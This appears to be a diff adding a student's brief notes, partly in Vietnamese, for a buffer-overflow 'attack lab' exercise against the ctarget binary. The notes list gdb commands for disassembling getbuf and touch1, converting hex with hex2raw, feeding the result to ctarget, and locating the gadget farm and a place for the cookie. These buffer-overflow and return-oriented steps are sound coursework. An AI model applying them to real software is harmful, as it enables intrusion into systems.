@@ -1,0 +1,17 @@
+./ctarget -q
+disas getbuf
+disas touch1
+
+
+gedit ctarget.l1
+10 byte + địa chỉ hàm touch 1
+
+./hex2raw < ctarget.l1 > ctarget.raw
+->mã máy của chuỗi t vừa nhập
+
+./ctarget <ctarget.raw -q
+
+target 3
+vùng cho phép khai thác: <start farm> -> <end farm> 
+x/40xw $rsp
+tìm chỗ đặt cái cookie vô
